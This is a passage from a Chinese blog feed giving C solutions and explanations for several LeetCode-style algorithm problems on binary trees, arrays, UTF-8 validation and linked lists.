tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct TreeNode *left;</span><br><span class="hljs-comment"> *     struct TreeNode *right;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">isMirror</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode* l,<span class="hljs-keyword">struct</span> TreeNode* r)</span>&#123;<br>    <span class="hljs-keyword">if</span>(!l&amp;&amp;!r)<span class="hljs-comment">//都为NULL</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">if</span>(!l||!r)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> (l-&gt;val==r-&gt;val)&amp;&amp;isMirror(l-&gt;left,r-&gt;right)&amp;&amp;isMirror(l-&gt;right,r-&gt;left);<br>&#125;<br><span class="hljs-type">bool</span> <span class="hljs-title function_">isSymmetric</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode* root)</span>&#123;<br>    <span class="hljs-keyword">return</span> isMirror(root,root);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-寻找旋转排序数组中的最小值"><a href="#3-寻找旋转排序数组中的最小值" class="headerlink" title="3.寻找旋转排序数组中的最小值"></a>3.寻找旋转排序数组中的最小值</h2><h3 id="3-1-题目描述"><a href="#3-1-题目描述" class="headerlink" title="3.1 题目描述"></a>3.1 题目描述</h3><p>假设按照升序排序的数组在预先未知的某个点上进行了旋转。</p><p>( 例如，数组 [0,1,2,4,5,6,7]  可能变为 [4,5,6,7,0,1,2] )。</p><p>请找出其中最小的元素。</p><p>你可以假设数组中不存在重复元素。</p><p>来源：<a href="https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array">https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array</a></p><h3 id="3-2思路分析"><a href="#3-2思路分析" class="headerlink" title="3.2思路分析"></a>3.2思路分析</h3><p>这个题就是最简单的排序，但是我们要想办法找一个时间复杂度小的算法。</p><p>最简单的直接排序就不说了，有个想法就是找出来旋转的那个点，特征就是前面的数字比后面的数字大，那么后面那个数字一定是最小的。但是要注意边界问题，下面的注释有说明。</p><h3 id="3-3代码"><a href="#3-3代码" class="headerlink" title="3.3代码"></a>3.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">findMin</span><span class="hljs-params">(<span class="hljs-type">int</span>* nums, <span class="hljs-type">int</span> numsSize)</span>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">if</span>(numsSize &lt;= <span class="hljs-number">1</span>)&#123;<span class="hljs-comment">//判断数组长度是否为1，为1直接返回</span><br>        <span class="hljs-keyword">return</span> nums[numsSize- <span class="hljs-number">1</span>]; <br>    &#125;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i&lt;numsSize - <span class="hljs-number">1</span>;i++)&#123;<span class="hljs-comment">//一般情况</span><br>        <span class="hljs-keyword">if</span>(nums[i]&gt;nums[i+<span class="hljs-number">1</span>])&#123;<br>            <span class="hljs-keyword">return</span> nums[i+<span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(nums[numsSize<span class="hljs-number">-1</span>] &lt; nums[<span class="hljs-number">0</span>])&#123;<span class="hljs-comment">//全反转情况</span><br>        <span class="hljs-keyword">return</span> nums[numsSize - <span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-keyword">return</span> nums[<span class="hljs-number">0</span>];<span class="hljs-comment">//未反转情况</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-二叉搜索树中第K小的元素"><a href="#4-二叉搜索树中第K小的元素" class="headerlink" title="4.二叉搜索树中第K小的元素"></a>4.二叉搜索树中第K小的元素</h2><h3 id="4-1题目描述"><a href="#4-1题目描述" class="headerlink" title="4.1题目描述"></a>4.1题目描述</h3><p>给定一个二叉搜索树，编写一个函数 kthSmallest 来查找其中第 k 个最小的元素。</p><p>说明：<br>你可以假设 k 总是有效的，1 ≤ k ≤ 二叉搜索树元素个数。</p><p>示例 1:</p><p>输入: root &#x3D; [3,1,4,null,2], k &#x3D; 1<br>   3<br>  &#x2F; <br> 1   4<br>  <br>   2<br>输出: 1</p><p>示例 2:</p><p>输入: root &#x3D; [5,3,6,2,4,null,null,1], k &#x3D; 3<br>       5<br>      &#x2F; <br>     3   6<br>    &#x2F; <br>   2   4<br>  &#x2F;<br> 1<br>输出: 3</p><p>来源：<a href="https://leetcode-cn.com/problems/kth-smallest-element-in-a-bst">https://leetcode-cn.com/problems/kth-smallest-element-in-a-bst</a></p><h3 id="4-2思路分析"><a href="#4-2思路分析" class="headerlink" title="4.2思路分析"></a>4.2思路分析</h3><p>最开始忘记了二叉搜索树的性质，所以还想着遍历之后再排序，后来发现二叉排序树是有性质的，采用中序遍历的结果就是从小到大排列的值。</p><p>于是我们可以递归采用中序遍历选出第k个值即可。</p><p>为了优化算法，我们在找到第k个值之后就结束，这样就可以减小搜索的时间复杂度。</p><h3 id="4-3代码"><a href="#4-3代码" class="headerlink" title="4.3代码"></a>4.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct TreeNode *left;</span><br><span class="hljs-comment"> *     struct TreeNode *right;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//因为是二叉查找树，所以节点比左孩子小，比右孩子大，</span><br><span class="hljs-comment">//使用递归的方法进行中序遍历，遍历的过程中将节点存入到队列中，队列中的元素即为从小到大排序好了，</span><br><span class="hljs-comment">//最后要第K小的元素，就从队列中出队好了</span><br><span class="hljs-comment">//遍历到第k个元素即可停止遍历</span><br><span class="hljs-type">int</span> findResult[<span class="hljs-number">100</span>],counter;<br><span class="hljs-type">void</span> <span class="hljs-title function_">LDR</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode * root,<span class="hljs-type">int</span> k)</span>&#123;<span class="hljs-comment">//</span><br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span> || counter &gt; k)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    LDR(root-&gt;left,k);<br>    findResult[counter++] = root-&gt;val;<br>    LDR(root-&gt;right,k);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">kthSmallest</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode* root, <span class="hljs-type">int</span> k)</span>&#123;<br>    counter = <span class="hljs-number">0</span>;<br>    LDR(root,k);<br>    <span class="hljs-keyword">return</span> findResult[k<span class="hljs-number">-1</span>];<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-4复习遍历算法"><a href="#4-4复习遍历算法" class="headerlink" title="4.4复习遍历算法"></a>4.4复习遍历算法</h3><h4 id="先序遍历"><a href="#先序遍历" class="headerlink" title="先序遍历"></a>先序遍历</h4><p>前序遍历首先访问根结点然后遍历左子树，最后遍历右子树。在遍历左、右子树时，仍然先访问根结点，然后遍历左子树，最后遍历右子树。</p><p>若二叉树为空则结束返回，否则：</p><ul><li>访问根节点</li><li>前序遍历左子树</li><li>前序遍历右子树</li></ul><p>已知后序遍历和中序遍历，就能确定前序遍历。</p><h4 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h4><p>中序遍历首先遍历左子树，然后访问根结点，最后遍历右子树。若二叉树为空则结束返回，否则：</p><ul><li>中序遍历左子树</li><li>访问根结点</li><li>中序遍历右子树</li></ul><h4 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h4><p>后序遍历首先遍历左子树，然后遍历右子树，最后访问根结点，在遍历左、右子树时，仍然先遍历左子树，然后遍历右子树，最后遍历根结点。</p><p>若二叉树为空则结束返回，否则：</p><ul><li>后序遍历左子树</li><li>后序遍历右子树</li><li>访问根节点</li></ul><p>三种遍历算法采用递归最容易实现。</p><h2 id="5-UTF8编码验证"><a href="#5-UTF8编码验证" class="headerlink" title="5.UTF8编码验证"></a>5.UTF8编码验证</h2><h3 id="5-1题目描述"><a href="#5-1题目描述" class="headerlink" title="5.1题目描述"></a>5.1题目描述</h3><p>UTF-8 中的一个字符可能的长度为 1 到 4 字节，遵循以下的规则：</p><pre><code class="hljs">对于 1 字节的字符，字节的第一位设为0，后面7位为这个符号的unicode码。对于 n 字节的字符 (n &gt; 1)，第一个字节的前 n 位都设为1，第 n+1 位设为0，后面字节的前两位一律设为10。剩下的没有提及的二进制位，全部为这个符号的unicode码。</code></pre><p>这是 UTF-8 编码的工作方式：</p><p>   Char. number range  |        UTF-8 octet sequence<br>      (hexadecimal)          |              (binary)<br>   ——————————-+———————————————<br>   0000 0000-0000 007F | 0xxxxxxx<br>   0000 0080-0000 07FF | 110xxxxx 10xxxxxx<br>   0000 0800-0000 FFFF | 1110xxxx 10xxxxxx 10xxxxxx<br>   0001 0000-0010 FFFF | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</p><p>给定一个表示数据的整数数组，返回它是否为有效的 utf-8 编码。</p><p>注意:<br>输入是整数数组。只有每个整数的最低 8 个有效位用来存储数据。这意味着每个整数只表示 1 字节的数据。</p><p>来源：<a href="https://leetcode-cn.com/problems/utf-8-validation">https://leetcode-cn.com/problems/utf-8-validation</a></p><h3 id="5-2思路分析"><a href="#5-2思路分析" class="headerlink" title="5.2思路分析"></a>5.2思路分析</h3><p>最简单的思路就是不做什么进制转换，直接按照不同条件分支判断即可，然后判断后面的字符是否符合标准，如果有一个不符合就直接返回false。中间踩了一个坑，就是忘记了数字位数不够的问题，导致数组访问溢出的情况。</p><h3 id="5-3代码"><a href="#5-3代码" class="headerlink" title="5.3代码"></a>5.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">validUtf8</span><span class="hljs-params">(<span class="hljs-type">int</span>* data, <span class="hljs-type">int</span> dataSize)</span>&#123;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>,j;<br>    <span class="hljs-keyword">while</span>(i&lt;dataSize)&#123;<br>        <span class="hljs-keyword">if</span>(data[i]&gt;=<span class="hljs-number">240</span>&amp;&amp;data[i]&lt;=<span class="hljs-number">247</span>)&#123;<span class="hljs-comment">//情形4</span><br>            <span class="hljs-keyword">if</span>(dataSize&lt;<span class="hljs-number">4</span>)&#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            <span class="hljs-keyword">for</span>(j = <span class="hljs-number">1</span>;j &lt; <span class="hljs-number">4</span>;j++)&#123;<br>                <span class="hljs-keyword">if</span>(data[i+j]&lt;<span class="hljs-number">128</span>||data[i+j]&gt;<span class="hljs-number">191</span>)&#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>            i = i+<span class="hljs-number">4</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(data[i]&gt;=<span class="hljs-number">224</span>&amp;&amp;data[i]&lt;=<span class="hljs-number">239</span>)&#123;<span class="hljs-comment">//情形3</span><br>            <span class="hljs-keyword">for</span>(j = <span class="hljs-number">1</span>;j &lt; <span class="hljs-number">3</span>;j++)&#123;<br>                <span class="hljs-keyword">if</span>(dataSize&lt;<span class="hljs-number">3</span>)&#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span>(data[i+j]&lt;<span class="hljs-number">128</span>||data[i+j]&gt;<span class="hljs-number">191</span>)&#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>            i = i+<span class="hljs-number">3</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(data[i]&gt;=<span class="hljs-number">192</span>&amp;&amp;data[i]&lt;=<span class="hljs-number">223</span>)&#123;<span class="hljs-comment">//情形2</span><br>            <span class="hljs-keyword">if</span>(dataSize&lt;<span class="hljs-number">2</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(data[i+<span class="hljs-number">1</span>]&lt;<span class="hljs-number">128</span>||data[i+<span class="hljs-number">1</span>]&gt;<span class="hljs-number">191</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;  <br>            i = i+<span class="hljs-number">2</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(data[i]&lt;=<span class="hljs-number">127</span>)&#123;<span class="hljs-comment">//情形1</span><br>            i = i + <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<span class="hljs-comment">//不符合要求</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-二叉树的最小深度"><a href="#6-二叉树的最小深度" class="headerlink" title="6.二叉树的最小深度"></a>6.二叉树的最小深度</h2><h3 id="6-1题目描述"><a href="#6-1题目描述" class="headerlink" title="6.1题目描述"></a>6.1题目描述</h3><p>给定一个二叉树，找出其最小深度。</p><p>最小深度是从根节点到最近叶子节点的最短路径上的节点数量。</p><p>说明: 叶子节点是指没有子节点的节点。</p><p>示例:</p><p>给定二叉树 [3,9,20,null,null,15,7],</p><pre><code class="hljs">3</code></pre><p>   &#x2F; <br>  9  20<br>    &#x2F;  <br>   15   7</p><p>返回它的最小深度  2.</p><p>来源：<a href="https://leetcode-cn.com/problems/minimum-depth-of-binary-tree">https://leetcode-cn.com/problems/minimum-depth-of-binary-tree</a></p><h3 id="6-2思路分析"><a href="#6-2思路分析" class="headerlink" title="6.2思路分析"></a>6.2思路分析</h3><p>第一思路就是使用递归遍历，遍历整棵树后即可获得树的最小深度。</p><p>递归算法一定要注意，当时我将depth初始化为0的时候会出错，因为后面有个取最小值的步骤，如果深度初始化为0，每次取最小值都取0，最后结果肯定是错误的。因此我们需要取一个最大的值，保证不会出问题。</p><h3 id="6-3代码"><a href="#6-3代码" class="headerlink" title="6.3代码"></a>6.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct TreeNode *left;</span><br><span class="hljs-comment"> *     struct TreeNode *right;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">min</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>&#123;<br>    <span class="hljs-keyword">if</span> (a&lt;=b)&#123;<br>        <span class="hljs-keyword">return</span> a;<br>    &#125;<br>    <span class="hljs-keyword">return</span> b;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">minDepth</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode* root)</span>&#123;<br>    <span class="hljs-keyword">if</span>(root == <span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> depth = <span class="hljs-number">65535</span>;<span class="hljs-comment">//不应该初始化为0，应该初始化为一个大的值</span><br>    <span class="hljs-keyword">if</span>(root-&gt;left == <span class="hljs-literal">NULL</span> &amp;&amp; root-&gt;right == <span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(root-&gt;left != <span class="hljs-literal">NULL</span>)&#123;<br>        depth = min(minDepth(root-&gt;left),depth);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(root-&gt;right != <span class="hljs-literal">NULL</span>)&#123;<br>        depth = min(minDepth(root-&gt;right),depth);<br>    &#125;<br>    <span class="hljs-keyword">return</span> depth+<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法练习</title>
    <link href="/blog/2020/02/22/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0/"/>
    <url>/blog/2020/02/22/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><strong>假期闲着没事干刷刷算法题，为以后找工作面试做一下准备工作</strong></p><p><img src="/images/fj27.jpg"></p><span id="more"></span><h2 id="1-数组中的重复数字"><a href="#1-数组中的重复数字" class="headerlink" title="1.数组中的重复数字"></a>1.数组中的重复数字</h2><h3 id="1-1题目描述"><a href="#1-1题目描述" class="headerlink" title="1.1题目描述"></a>1.1题目描述</h3><p>在一个长度为 n 的数组里的所有数字都在 0 到 n-1 的范围内。数组中某些数字是重复的，但不知道有几个数字是重复的，也不知道每个数字重复几次。请找出数组中任意一个重复的数字。要求时间复杂度 O(N)，空间复杂度 O(1)。</p><h3 id="1-2思路分析"><a href="#1-2思路分析" class="headerlink" title="1.2思路分析"></a>1.2思路分析</h3><p>为了使时间复杂度和空间复杂度满足要求，不能使用排序或者再创建一个数组记录。对于数组元素在0到n-1范围内的数组我们可以采用将值为 i 的元素调整到第 i 个位置上进行求解。本题要求找出重复的数字，因此在调整过程中，如果第 i 位置上已经有一个值为 i 的元素，就可以知道 i 值重复。</p><h3 id="1-3代码"><a href="#1-3代码" class="headerlink" title="1.3代码"></a>1.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">swap</span><span class="hljs-params">(<span class="hljs-type">int</span> *nums,<span class="hljs-type">int</span> i,<span class="hljs-type">int</span> j)</span>&#123;<span class="hljs-comment">//将nums数组中i位置和j位置交换 </span><br><span class="hljs-type">int</span> temp;<br>temp = nums[i];<br>nums[i] = nums[j];<br>nums[j] = temp;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span> nums[]=&#123;<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>&#125;,i,j;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">6</span>;i++)&#123;<br><span class="hljs-keyword">if</span>(nums[i]!=i)&#123;<span class="hljs-comment">//保证当前位置数字没有交换过 </span><br><span class="hljs-keyword">if</span>(nums[i]==nums[nums[i]])<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,nums[i]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>swap(nums,i,nums[i]);<br>&#125;<br><br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;no repeat num\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-跳台阶问题"><a href="#2-跳台阶问题" class="headerlink" title="2.跳台阶问题"></a>2.跳台阶问题</h2><h3 id="2-1-题目描述"><a href="#2-1-题目描述" class="headerlink" title="2.1 题目描述"></a>2.1 题目描述</h3><p>一只青蛙一次可以跳上 1 级台阶，也可以跳上 2 级。求该青蛙跳上一个 n 级的台阶总共有多少种跳法。</p><h3 id="2-2-思路分析"><a href="#2-2-思路分析" class="headerlink" title="2.2 思路分析"></a>2.2 思路分析</h3><p>假设到第 n 阶总共有 f(n) 种跳法，而且想跳到第 n 阶只有两种可能，要么从第 n-1 阶跳一阶到达，要么从第 n-2 阶跳两阶到达，所以递推式为f(n) &#x3D; f(n-1) + f(n-2)。特殊情况为，n&#x3D;0 的时候跳法为 0；n&#x3D;1时，跳法为1；n&#x3D;2时，跳法为2。</p><h3 id="2-3-代码"><a href="#2-3-代码" class="headerlink" title="2.3 代码"></a>2.3 代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">jump</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span>&#123;<br><span class="hljs-keyword">if</span>(num &lt; <span class="hljs-number">1</span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(num == <span class="hljs-number">1</span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(num == <span class="hljs-number">2</span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>&#125;<br><span class="hljs-keyword">return</span> jump(num<span class="hljs-number">-1</span>)+jump(num<span class="hljs-number">-2</span>);<span class="hljs-comment">//使用递归算法 </span><br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span> num,result;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;num);<br>result = jump(num);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,result);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><h2 id="3-链表中倒数第k个节点"><a href="#3-链表中倒数第k个节点" class="headerlink" title="3.链表中倒数第k个节点"></a>3.链表中倒数第k个节点</h2><h3 id="3-1题目描述"><a href="#3-1题目描述" class="headerlink" title="3.1题目描述"></a>3.1题目描述</h3><p>难度简单8输入一个链表，输出该链表中倒数第k个节点。为了符合大多数人的习惯，本题从1开始计数，即链表的尾节点是倒数第1个节点。例如，一个链表有6个节点，从头节点开始，它们的值依次是1、2、3、4、5、6。这个链表的倒数第3个节点是值为4的节点。</p><h3 id="3-2思路分析"><a href="#3-2思路分析" class="headerlink" title="3.2思路分析"></a>3.2思路分析</h3><p>最开始想到的思路也是最容易想到的就是先计算链表长度，然后减k，从head遍历这个长度后返回即是倒数第k个节点。</p><h3 id="3-3代码"><a href="#3-3代码" class="headerlink" title="3.3代码"></a>3.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct ListNode *next;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">struct</span> ListNode* <span class="hljs-title function_">getKthFromEnd</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ListNode* head, <span class="hljs-type">int</span> k)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ListNode</span>* <span class="hljs-title">p1</span>;</span><br>    p1 = head;<br>    <span class="hljs-type">int</span> num = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(;p1-&gt;next!=<span class="hljs-literal">NULL</span>;p1=p1-&gt;next)&#123;<br>        num++;<br>    &#125;<br>    num = num - k;<br>    <span class="hljs-keyword">for</span>(;num&gt;=<span class="hljs-number">0</span>;num--)&#123;<br>        head = head-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> head;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-4参考最优解法"><a href="#3-4参考最优解法" class="headerlink" title="3.4参考最优解法"></a>3.4参考最优解法</h3><p>设置两个指针，快指针比慢指针深入k个节点， 当快指针为空时，慢指针也就到了size(head)-k个节点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct ListNode *next;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><br><span class="hljs-keyword">struct</span> ListNode* 